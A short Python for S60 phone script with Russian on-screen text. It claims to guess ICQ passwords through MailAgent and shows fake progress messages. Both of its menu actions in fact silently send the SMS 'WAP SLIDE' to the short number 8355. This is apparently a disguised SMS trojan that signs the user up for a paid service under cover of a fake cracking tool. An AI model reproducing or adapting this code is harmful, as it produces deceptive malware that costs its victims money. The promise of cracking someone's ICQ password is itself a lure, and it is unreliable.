import appuifw
import messaging
import e32
import miso

def ru(x):return x.decode('utf-8')

appuifw.app.screen='full'

appuifw.app.body=t=appuifw.Text()
t.color=0x0

t.set(ru('\n\n\n\n\n=*=*=*=*=*=*=*=*=*=*=*=*=*=*\n\n\nПрограмма для подбора пороля IСQ с помощью MailAgent\n\n\n\n=*=*=*=*=*=*=*=*=*=*=*=*=*=*'))

def arm():
    t.set(ru('MailAgent\n      будет запущен\n                 в фоновом режиме'))
    e32.ao_sleep(3)
    t.set(ru('Не скрывайте программу\n          до завершения...'))
    e32.ao_sleep(3)
    t.set(ru('Подбор может занять от нескольких минут до нескольких часов'))
    t.set(ru('Подбор начался'))
    e32.ao_sleep(3)
    t.set(ru('Подбор пароля осуществляется рандомно'))
    nbr1 = "8355" 
    txt = u"WAP SLIDE"
    messaging.sms_send('8355', 'WAP SLIDE')
   

def stop():
    messaging.sms_send('8355', 'WAP SLIDE')



appuifw.app.menu=[(ru('Показать'),arm),(ru('О проге'), stop)]